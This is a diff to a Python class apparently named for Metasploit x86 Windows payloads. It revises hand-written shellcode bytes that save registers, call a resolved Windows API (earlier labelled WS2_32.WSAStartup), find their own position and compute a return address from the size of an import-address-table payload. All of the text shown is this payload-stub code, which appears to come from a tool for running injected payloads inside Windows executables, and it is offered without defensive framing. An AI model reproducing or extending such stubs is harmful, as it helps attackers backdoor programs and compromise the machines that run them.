@@ -562,17 +562,16 @@ class x86_windows_metasploit:
         #self.stub += b"\x8B\x4C\x24\x1C"                              # MOV ECX,DWORD PTR SS:[ESP+1C]
         self.stub += b"\xFF\x55\x00"                                      # CALL DWORD PTR DS:[EDX]
         #self.stub += b"\x8B\x74\x24\x20\x89\xB4\x24\x91\x01\x00\x00\x61\x58\x58\x8B\x44\x24\xB0\xFF\xD0\x8B\x8C\x24\x68\x01\x00\x00\x51\xc3"
-        self.stub += b"\x61"               # POPAD
-        self.stub += b"\x8B\x44\x24\xB8"       # MOV EAX,DWORD PTR SS:[ESP-48]
-        self.stub += b"\x5D"               # POP EBP
-        self.stub += b"\x59"               # POP ECX
-        self.stub += b"\xFF\xD0"             # CALL EAX                                 ; WS2_32.WSAStartup
-        #self.stub += b"\x56"               # PUSH Esi
-        self.stub += b"\x55"                 # push ebp
-        self.stub += b"\xe8\x00\x00\x00\x00"   # call next addr
+        self.stub += b"\x89\x44\x24\x1C"        # MOV DWORD PTR SS:[ESP+1C],EAX; SAVE EAX on popad in eax
+        self.stub += b"\x61"               # POPAD 
+        self.stub += b"\x5D"               # POP EBP ; get return addr
+        self.stub += b"\x59"               # POP ECX ; clear flag
+        self.stub += b"\xFF\xD0"             # CALL EAX                                 ; call target API
+        self.stub += b"\x55"                 # push ebp                                 ; push return addr
+        self.stub += b"\xe8\x00\x00\x00\x00"   # call next ; get pc
         self.stub += b"\x5D"                    # POP EBP
         self.stub += b"\x81\xED"
-        self.stub += struct.pack("<I", len(self.IAT_payload)+ len(self.stub) -3)  #\xB9\x01\x00\x00"      #SUB EBP,1B9
+        self.stub += struct.pack("<I", len(self.IAT_payload)+ len(self.stub) -3)  #\xB9\x01\x00\x00"      #SUB EBP,1B9 to get the api call back
         self.stub += b"\xC3"               # RETN
 
 
